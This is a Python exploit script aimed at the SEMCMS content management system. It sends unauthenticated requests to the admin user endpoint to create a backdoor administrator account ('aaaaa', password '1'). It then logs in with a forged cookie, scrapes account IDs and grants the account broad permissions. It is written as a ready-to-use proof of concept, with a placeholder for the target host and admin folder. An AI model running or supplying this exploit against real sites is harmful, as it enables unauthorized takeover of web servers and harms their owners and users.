import requests
import re

# Add account aaaaa, password 1
def add_account(host):
    add_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = "user_name=%E6%80%BB%E8%B4%A6%E5%8F%B7&user_admin=aaaaa&user_ps=c4ca4238a0b923820dcc509a6f75849b&user_tel=17012341234&user_email=1%401.com&submit=%E5%A2%9E%E5%8A%A0"

    add_response = requests.post(host + "/SEMCMS_User.php?Class=add&CF=user", headers=add_headers, data=data)

    if(add_response.text.find("404") == -1):

        login_headers = {'Content-Type': 'application/x-www-form-urlencoded',
                         'Cookie': '__51cke__=; __tins__4329483=%7B%22sid%22%3A%201708349741717%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201708351600405%7D; __51laig__=3; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=aaaaa; scuserpass=c4ca4238a0b923820dcc509a6f75849b'}
        response = requests.post(host + "/SEMCMS_User.php", headers=login_headers)
        c = re.compile(r'AID\[\]" value="[0-9]+"')
        m = c.findall(response.text)
        list = []
        for i in m:
            x = i.split('="')
            list.append(x[1].replace('"', ""))

        # add permission
        fp_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        fp_data = "ID%5B%5D=74&ID%5B%5D=76&ID%5B%5D=77&ID%5B%5D=87&ID%5B%5D=88&ID%5B%5D=116&ID%5B%5D=123&ID%5B%5D=170&ID%5B%5D=75&ID%5B%5D=78&ID%5B%5D=79&ID%5B%5D=80&ID%5B%5D=81&ID%5B%5D=82&ID%5B%5D=83&ID%5B%5D=84&ID%5B%5D=89&ID%5B%5D=100&ID%5B%5D=181&ID%5B%5D=en&uid=" + list.pop() + "&button=%E5%88%86%E9%85%8D"
        fp_response = requests.post(host + "/SEMCMS_User.php?CF=fenpei", headers=fp_headers, data=fp_data)
        print("success, account aaaaa, password 1")

    else:
        print("IP and admin folder name error")


# Fill in your IP and admin folder name
# login page:http://sem.com/g7jSCC_Admin/index.html
add_account("http://sem.com/g7jSCC_Admin")
